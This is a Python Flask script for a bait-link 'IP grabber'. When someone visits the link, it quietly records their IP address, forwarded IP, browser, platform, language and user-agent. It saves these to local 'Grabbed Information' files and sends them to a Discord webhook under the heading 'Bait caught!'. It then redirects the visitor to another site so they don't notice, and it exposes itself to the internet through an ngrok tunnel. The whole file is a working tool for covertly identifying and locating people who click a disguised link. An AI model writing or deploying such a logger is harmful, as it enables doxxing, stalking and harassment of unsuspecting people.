from flask import Flask, redirect, request
import shared
import traceback
from discord_webhook import DiscordWebhook, DiscordEmbed
from pyngrok import ngrok, conf
import os

app = Flask(__name__)

@app.route('/')
def redirect_to_site():
    # Gather client info
    ip       = request.remote_addr or "Unknown"
    real_ip  = request.headers.get('X-Forwarded-For', ip)
    ua       = request.user_agent
    platform = ua.platform or "Unknown"
    browser  = ua.browser or "Unknown"
    version  = ua.version or "Unknown"
    language = request.accept_languages.best or "Unknown"
    # Full User-Agent string
    raw_ua   = request.headers.get('User-Agent', ua.string or "Unknown")

    # Ensure output directory exists
    grabs_dir = os.path.join(os.getcwd(), "grabs")
    os.makedirs(grabs_dir, exist_ok=True)

    # Find next available filename
    index = 1
    while True:
        filename = os.path.join(grabs_dir, f"Grabbed Information {index}.txt")
        if not os.path.exists(filename):
            break
        index += 1

    # Build info block
    info = (
        "=================GREB=================\n"
        f"IP: {ip}\n"
        f"REAL IP: {real_ip}\n"
        f"Platform: {platform}\n"
        f"Browser: {browser}\n"
        f"Version: {version}\n"
        f"Language: {language}\n"
        "=================GREB=================\n"
        "==============USER-AGENT==============\n"
        f"{raw_ua}\n"
        "==============USER-AGENT==============\n"
    )

    # Write to file
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(info)
        app.logger.info(f"Saved client info to {filename}")
    except Exception:
        app.logger.error("Failed to write client info file.")
        traceback.print_exc()

    # Send Discord webhook
    try:
        webhook = DiscordWebhook(
            url=shared.discord_webhook,
            username="Greb Logger",
            timeout=10
        )
        webhook.content = "@everyone"
        embed = DiscordEmbed(title="Bait caught!", color=0x8B0000)
        fields = {
            "IP": ip,
            "REAL IP": real_ip,
            "Platform": platform,
            "Browser": browser,
            "Version": version,
            "Language": language,
            "User-Agent": raw_ua
        }
        for name, value in fields.items():
            embed.add_embed_field(name=name, value=f"`{value}`", inline=False)
        webhook.add_embed(embed)
        response = webhook.execute()
        if response.status_code not in (200, 204):
            app.logger.error(f"Discord webhook failed with status {response.status_code}: {response.text}")
    except Exception:
        app.logger.error("Failed to send Discord webhook.")
        traceback.print_exc()

    return redirect(shared.redirect_url, code=302)


def run():
    # Tear down any stray ngrok
    try:
        ngrok.kill()
    except Exception:
        pass

    # Set default ngrok region
    conf.get_default().region = "eu"

    # Start ngrok tunnel
    listener = ngrok.connect(addr=5000, proto="http", bind_tls=True)
    print(f"Ingress established at {listener.public_url}")

    # Run Flask
    app.run(host="0.0.0.0", port=5000, debug=True, use_reloader=False)


if __name__ == "__main__":
    run()
